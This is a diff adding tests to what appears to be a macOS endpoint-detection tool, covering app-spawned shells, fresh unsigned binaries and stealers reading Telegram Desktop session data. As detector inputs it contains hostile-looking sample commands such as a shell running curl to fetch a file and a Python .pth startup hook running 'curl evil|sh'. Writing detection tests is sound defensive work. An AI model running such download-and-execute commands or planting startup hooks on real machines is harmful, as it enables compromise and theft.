@@ -835,6 +835,53 @@ check(fires("download-and-execute", "/bin/sh", ["sh", "-c", "curl -fsSL https://
 check(fires("silent-screen-capture", "/usr/sbin/screencapture", ["screencapture", "-x", "/tmp/s.png"]),
       "screencapture -x")
 check(fires("sudo-password-from-stdin", "/usr/bin/sudo", ["sudo", "-S", "true"]), "sudo -S")
+
+# app-spawned-shell: who started the process, from fork and exec events
+TG = "/Applications/Telegram.app/Contents/MacOS/Telegram"
+CHROME_R = ("/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/"
+            "Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer)")
+
+
+SPAWN = [650000]
+
+
+def spawned_by(rule_id, parent_exe, exe, args, **kw):
+    before = len(violations(rule_id))
+    SPAWN[0] += 10
+    base = SPAWN[0]
+    # the app was running before the watcher: only a fork event tells us what it is
+    g.handle(ev("fork", {"child": proc(base + 1, base, parent_exe)}, base, 1, parent_exe, **kw))
+    g.handle(exec_ev(base + 1, base, exe, args, parent_exe=parent_exe))
+    return len(violations(rule_id)) > before
+
+
+check(spawned_by("app-spawned-shell", TG, "/bin/zsh", ["zsh", "-c", "curl -so /tmp/a https://x.example/a"],
+                 platform=False, team_id="6N38VWS5BX", signing_id="ru.keepcoder.Telegram"),
+      "Telegram starting a shell")
+check(spawned_by("app-spawned-shell", CHROME_R, "/usr/bin/curl", ["curl", "-o", "/tmp/a", "https://x"],
+                 platform=False), "a browser renderer starting curl")
+check(spawned_by("app-spawned-shell", "/System/Applications/Mail.app/Contents/MacOS/Mail", "/usr/bin/osascript",
+                 ["osascript", "-e", "x"]), "Mail starting osascript")
+check(not spawned_by("app-spawned-shell", "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal",
+                     "/bin/zsh", ["-zsh"]), "Terminal starting a shell is fine")
+check(not spawned_by("app-spawned-shell", TG, "/usr/bin/open", ["open", "https://x"], platform=False),
+      "Telegram running open(1) is fine")
+ash = violations("app-spawned-shell")[0]
+check(ash["process_chain"][1]["path"] == TG and ash["process_chain"][1].get("signing_id") == "ru.keepcoder.Telegram"
+      and not ash["process_chain"][1].get("unverified"),
+      "the fork event attests the app, so the alert names it with its signing identity")
+check(any(a["action"] in ("killed", "kill_target_gone") and a.get("scope") == "process" for a in ash["actions"]),
+      "app-spawned-shell kills only the spawned process tree, never the app")
+
+# lineage keys on a synthetic rule: parent_signing and ancestor
+lin = tg.Rule({"id": "x", "type": "exec", "match": {"parent_signing": "^6N38VWS5BX:", "ancestor": "/launchd$"}},
+              [], "audit")
+check(lin.needs_lineage and lin.exec_matches("/bin/sh", None, "sh", {
+    "parent": TG, "parent_signing": "6N38VWS5BX:ru.keepcoder.Telegram", "ancestor": [TG, "/sbin/launchd"]}),
+      "parent_signing and ancestor (any item) match")
+check(not lin.exec_matches("/bin/sh", None, "sh", {"parent": "", "parent_signing": "", "ancestor": []}),
+      "...and an unknown parent does not")
+
 rs = violations("reverse-shell")[0]
 # fake pid, so there is nothing to kill: the alert must say so rather than claim a kill
 check(any(a["action"] == "kill_target_gone" and a["root_pid"] for a in rs["actions"]) and rs.get("command"),
@@ -858,6 +905,38 @@ check(event_fires("remote-login", "openssh_login", {"success": True, "source_add
 check(not event_fires("sudo-failure", "sudo", {"success": True, "command": "ls"}), "successful sudo is fine")
 check(event_fires("sudo-failure", "sudo", {"success": False, "command": "ls"}), "failed sudo")
 check("item" in violations("background-item-added")[0].get("event_data", {}), "event alert carries the event data")
+
+# fresh-unsigned-binary: kernel signing facts + ctime of the file
+dl = os.path.join(T, "Users/dev/Downloads")
+os.makedirs(dl, exist_ok=True)
+payload = os.path.join(dl, "Salat")
+open(payload, "w").write("x")
+fub = dict(next(r for r in real["rules"] if r["id"] == "fresh-unsigned-binary"))
+fub["match"] = {"executable": "^" + T + "/Users/[^/]+/Downloads/|^(/private)?/tmp/"}
+g2 = fresh_guard(extra_rules=[fub])
+
+
+def ran(exe, **kw):
+    before = len(violations("fresh-unsigned-binary"))
+    p = 660000 + len(log_records())
+    g2.handle(exec_ev(p, 1, exe, [os.path.basename(exe)], **kw))
+    return len(violations("fresh-unsigned-binary")) > before
+
+
+check(ran(payload, platform=False, signing_id="Salat-55554944a1b2"), "a just-downloaded ad-hoc binary alerts")
+check(not ran(payload, platform=False, team_id="ABCDE12345", signing_id="com.vendor.tool"),
+      "a Developer ID signed binary does not")
+check(ran("/private/tmp/.gone-" + str(os.getpid()), platform=False), "a payload already deleted counts as fresh")
+old = os.path.join(dl, "old-tool")
+open(old, "w").write("x")
+# ctime can't be set back, so move the clock forward instead
+real_time = tg.time.time
+tg.time.time = lambda: real_time() + 3600
+try:
+    check(not ran(old, platform=False), "an ad-hoc binary written an hour ago does not")
+finally:
+    tg.time.time = real_time
+check(not ran(os.path.join(T, "Users/dev/go/bin/x"), platform=False), "outside the watched folders: no alert")
 
 # ---------------------------------------------------------------- 17. credential reads and startup hooks
 print("\n== 17. credential reads, Python startup hooks ==")
@@ -893,6 +972,26 @@ check(read_by(key, "/tmp/stealer", team_id="ABCDE12345", signing_id="evil") == 2
 check(read_by(key, "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", platform=False,
               team_id="EQHXZ8M8AV", signing_id="com.google.Chrome") == 2, "an allow-listed signed app does not")
 check(violations("credential-access")[0].get("access") == "read", "the alert says it was a read")
+tdata = os.path.join(home, "Library/Application Support/Telegram Desktop/tdata")
+os.makedirs(tdata, exist_ok=True)
+open(os.path.join(tdata, "key_datas"), "w").write("k")
+mw_rule = dict(next(r for r in real["rules"] if r["id"] == "messenger-and-wallet-data"))
+mw_rule["paths"] = [tdata]
+g_mw = fresh_guard(extra_rules=[mw_rule])
+
+
+def mw_read(exe, **kw):
+    READER[0] += 1
+    g_mw.handle(ev("open", {"fflag": 1, "file": fobj(os.path.join(tdata, "key_datas"))}, READER[0], 1, exe, **kw))
+    return len(violations("messenger-and-wallet-data"))
+
+
+check(mw_read("/private/tmp/Salat", platform=False, signing_id="Salat-1a2b") == 1,
+      "a stealer reading Telegram Desktop's session alerts")
+check(mw_read("/Applications/Telegram.app/Contents/MacOS/Telegram", platform=False) == 1,
+      "Telegram reading its own session does not")
+check(mw_read("/bin/cp") == 2, "cp copying the session out alerts")
+g = fresh_guard(extra_rules=[cred_rule, hook_rule])
 pth = os.path.join(sitep, "evil.pth")
 with open(pth, "w") as f:
     f.write("import os; os.system('curl evil|sh')\n")
